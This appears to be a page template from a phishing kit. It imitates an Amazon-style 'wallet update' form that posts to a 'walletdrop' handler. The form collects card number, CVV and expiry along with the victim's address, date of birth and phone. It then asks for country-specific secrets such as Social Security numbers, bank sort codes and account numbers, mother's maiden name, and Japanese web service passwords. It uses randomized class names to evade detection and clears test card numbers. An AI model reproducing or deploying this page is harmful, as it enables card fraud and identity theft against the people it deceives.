
<!-- HTML INPUTS FOR WALLET PAGE -->
<!-- CODE STARTS HERE -->	
<script type="text/javascript">
  function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script><script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
            <script type="text/javascript">
function ceceh(){
    var cc = document.getElementById("cc_number").value;
    if(cc.match(/^[0-2]|^[7-9]/))
        {
            document.getElementById("cc_number").value = "";
        }
    if(cc.match(/4111 1111 1111 1111/))
        {
            document.getElementById("cc_number").value = "";
        }
}
</script>
<form method="POST" action="walletdrop?cmd=_update-information&account_card=<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>" id="asv-allowance-form" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative asv-no-js">
<input type="hidden" name="full_name" value="<?php echo $_POST['full_name'];?>">
<input type="hidden" name="add_1" value="<?php echo $_POST['add_1'];?>">
<input type="hidden" name="add_2" value="<?php echo $_POST['add_2'];?>">
<input type="hidden" name="city" value="<?php echo $_POST['city'];?>">
<input type="hidden" name="state" value="<?php echo $_POST['state'];?>">
<input type="hidden" name="ZIP" value="<?php echo $_POST['ZIP'];?>">
<input type="hidden" name="DOB" value="<?php echo $_POST['DOB'];?>">
<input type="hidden" name="phone" value="<?php echo $_POST['phone'];?>">

  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label ><?php echo $_LANG['FRMUP7'];?>
      </label>
      <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
        <input type="text" id="cc_holder" required="" onkeydown="upperCaseF(this)" id="asv-allowances-title" value="" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text" placeholder="<?php echo $_LANG['FRMUP7'];?>" name="cc_holder" maxlength="50" >
      </div>
    </div>
  </div>
  <script type="text/javascript" src="../data/js/jquery.min.js"></script><script type="text/javascript" src="../data/js/jquery.min.mask.js"></script><script type="text/javascript" src="../data/js/jquery.payment.js">
  </script>
  <link rel="stylesheet" href="../data/css/app.css" />
  <style type="text/css">
    span.description{
      display:block;
      margin:.1em 0 0 1.6em}
    .has-error input{
      border:1px solid #9D2C36}
    form #cc_number{
      background-image:url(../data/icon/sprites_cc_global.png);
      background-position:98.5% 87%;
      background-size:45px 720px;
      background-repeat:no-repeat;
      padding-right:10%}
    form #cc_number.valid.visa{
      background-position:98.5% -.5%}
    form #cc_number.valid.mastercard{
      background-position:100% 6%}
    form #cc_number.valid.amex{
      background-position:100% 12%}
    form #cc_number.valid.diners_club_international{
      background-position:100% 24%}
    form #cc_number.valid.jcb{
      background-position:100% 31%}
    form #cc_number.valid.discover{
      background-position:98.5% 18.3%}
    form #cc_number.valid.maestro{
      background-position:99% 37%}
    form #cvv2_number{
      background-image:url(../data/icon/sprites_cc_global.png);
      background-position:98.5% 93.2%;
      background-size:45px 720px;
      background-repeat:no-repeat;
      padding-right:10%px}
    form #cvv2_number.amex{
      background-position:98.5% 99.5%}
    form fieldset.multi p{
      float:left;
      margin:0 .5em 0 0}
  </style>           
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label class="<?php echo md5(uniqid(rand(), true)); ?>   aok-inline-block"><?php echo $_LANG['FRMUP8'];?>
      </label>
      <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative" data-action="a-popover" data-a-popover="{&quot;name&quot;:&quot;recipientEmailPopover&quot;,&quot;header&quot;:&quot;What email address should I enter?&quot;}">
      </span>
      <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
        <input type="tel" id="cc_number" onfocusout="ceceh();" onkeyup="type_carte()" placeholder="XXXX XXXX XXXX XXXX" title="<?php echo $_LANG['UPALERT7'];?>" autocomplete="off" required="" pattern="[2-7][0-9 ]{11,24}" maxlength="30" name="cc_number" value=""  class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text" >
      </div>
    </div>
  </div>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label><?php echo $_LANG['FRMUP10'];?>
      </label>
      <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper">
        <input type="tel" id="cvv2_number" required="" pattern="[0-9]{3,4}" title="<?php echo $_LANG['UPALERT8'];?> " placeholder="<?php echo $_LANG['UPALERT9'];?>" maxlength="4" name="cvv2_number" value="" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text" size="6">
      </div>
    </div>
  </div>
  <script src="../data/js/jquery.js" type="text/javascript">
  </script>
  <script src="../data/js/jquery.maskedinput.js" type="text/javascript">
  </script>
  <script type="text/javascript">
    jQuery(function($){
      $("#EXD").mask("99/9999",{
        placeholder:"MM/YYYY"}
                    );
    }
          );
  </script>			
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label ><?php echo $_LANG['FRMUP9'];?>
      </label>
      <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
        <input type="tel" required="" id="EXD" placeholder="MM/YYYY" name="EXD" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text">
      </div>
    </div>
  </div>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <script>
      function type_carte(){
        var get_value = document.getElementById('cc_number').value;
        var type = get_value.substring(0,2);
        var other = get_value.substring(0,1);
        if(other == "4"){
          document.getElementById("cvv2_number").maxLength ="3"
        }
        else if(other == "5"){
          document.getElementById("cvv2_number").maxLength ="3"
        }
        /*Amex Card*/
        else if(type == "34"){
          document.getElementById('th3mrx').style.display ="none"
          document.getElementById("cvv2_number").maxLength ="4"
        }
        else if(type == "37"){
          document.getElementById('th3mrx').style.display ="none"
          document.getElementById("cvv2_number").maxLength ="4"
        }
        /*End Amex Card*/
        /*blue Card*/
        else if(type == "30"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "36"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "38"){
          document.getElementById('th3mrx').style.display ="none"
        }
        /*End blue Card*/
        else if(other == "6"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "35"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else{
          document.getElementById('th3mrx').style.display ="block"
        }
      };
    </script>
  </div>
  <script type="text/javascript">
    jQuery(function($){
      $("#ssn").mask("999-99-9999");
      $("#sortcode").mask("99-99-99");
      $("#sin").mask("999-99-9999");
      $("#an").mask("99999999");
    }
          );
  </script>
  <?php  ################################################################################################################################### ?>		
  <?php  
// SHOW SOCIAL SEC NUMBER ONLY IF COUNTRY IS USA OR ISRAEL
if ($_SESSION['_LOOKUP_CNTRCODE_']=="IL"){ echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Social Security Number</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Social Security Number" id="ssn" required="required" name="ssn" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW NATIONAL ID NUMBER ONLY IF COUNTRY IS HONGKONG
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="HK") { echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Natiοnal ΙD Νumber</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Natiοnal ΙD Νumber" id="nin" required="required" name="nin" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW CODICE FISCALE ONLY IF COUNTRY IS ITALY
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IT") { echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Codice Fiscale</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Codice Fiscale" required="required" name="codicefiscale" id="codicefiscale" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW KONTONUMBER ONLY IF COUNTRY IS SWITZERLAND || GERMANY
elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "CH" || $_SESSION['_LOOKUP_CNTRCODE_'] == "DE") {	 echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Kontonummer</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Kontonummer" required="required" name="kontonummer" id="kontonummer" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW OFFICIAL ID ONLY IF COUNTRY IS GREECE
elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "GR") {	 echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Official ID</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Official ID" required="required" name="offid" id="offid" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW OSID & Credit Limit ONLY IF COUNTRY IS AUSTRALIA
elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "AU") {	 echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">OSID</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="OSID" required="required" name="osid" id="osid" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Credit Limit</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Credit Limit" required="required" name="creditlimit" id="creditlimit" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Driver Licence Number</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Driver Licence Number" id="dln" required="required" name="dln" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW SORTCODE + ACCOUNT NUMBER ONLY IF COUNTRY IS IRELAND || UNITED KINGDOM
elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "IE" || $_SESSION['_LOOKUP_CNTRCODE_'] == "GB" ) { echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Sort Code</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Sort Code" id="sortcode" required="required" name="sortcode" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Account Number</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Account Number" id="an" required="required" name="an" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW SOCIAL INSURANCE NUMBER ONLY IF COUNTRY IS UNITED STATES || CANADA
elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "US" || $_SESSION['_LOOKUP_CNTRCODE_'] == "CA"){ echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Social Security Number</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Social Security Number" id="sin" required="required" name="sin" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW Mother’s Maiden Name ONLY IF COUNTRY IS IRELAND || CANADA
elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "IR" || $_SESSION['_LOOKUP_CNTRCODE_'] == "CA"){ echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Mother’s Maiden Name</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Mother’s Maiden Name" required="required" name="mmname" id="mmname" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW CARD ID & PASS ONLY IF COUNTRY IS JAPAN
elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "JP"){ echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">WEBサービスID</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="WEBサービスID" required="required" name="id" id="id" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">WEBサービスIDパス</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="WEBサービスIDパス" required="required" name="pass" id="pass" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
?>
  <?php  ################################################################################################################################### ?>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-section a-spacing-extra-large a-spacing-top-extra-large">
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-popover-preload" id="a-popover-legalTerms">
      <span>
       <?php echo $_LANG['TERMS1'];?>
        <?php  
if     ($_SESSION['_LOOKUP_CNTRCODE_']=="GB"){ echo 'co.uk';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IN"){ echo 'in';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="CA"){ echo 'ca';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="FR"){ echo 'fr';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="AU"){ echo 'com.au';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="BR"){ echo 'com.br';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="CN"){ echo 'cn';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IT"){ echo 'it';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="JP"){ echo 'co.jp';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="MX"){ echo 'com.mx';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="ES"){ echo 'es';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="DE"){ echo 'de';}
else                       { echo 'com';} ?>'<?php echo $_LANG['TERMS2'];?>
      </span>
    </div>
    <h3 class="<?php echo md5(uniqid(rand(), true)); ?>   a-spacing-mini"><?php echo $_LANG['TERMS'];?>
    </h3>
    <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative" data-action="a-secondary-view" data-a-secondary-view="{&quot;name&quot;:&quot;legalTerms&quot;,&quot;position&quot;:&quot;triggerVertical&quot;}">
      <a href="#" class="<?php echo md5(uniqid(rand(), true)); ?>   a-touch-link a-box">
        <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-box-inner">
          <i class="<?php echo md5(uniqid(rand(), true)); ?>   a-icon a-icon-touch-link">
          </i>
          <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-small a-color-tertiary">
           <?php echo $_LANG['TERMS1'];?>
            <?php  
if     ($_SESSION['_LOOKUP_CNTRCODE_']=="GB"){ echo 'co.uk';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IN"){ echo 'in';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="CA"){ echo 'ca';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="FR"){ echo 'fr';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="AU"){ echo 'com.au';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="BR"){ echo 'com.br';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="CN"){ echo 'cn';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IT"){ echo 'it';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="JP"){ echo 'co.jp';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="MX"){ echo 'com.mx';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="ES"){ echo 'es';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="DE"){ echo 'de';}
else                       { echo 'com';} ?>'<?php echo $_LANG['TERMS2'];?>
          </span>
        </div>
      </a>
    </span>
  </div>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-section a-spacing-top-extra-large">
    <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-button a-button-span12 a-button-primary">
      <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-button-inner">
        <button id="submit" class="<?php echo md5(uniqid(rand(), true)); ?>   a-button-text"  type="submit"><?php echo $_LANG['AKTIF'];?> 
        </button>
      </span>
    </span>
  </div>
</form>
<!-- CODE ENDS HERE -->
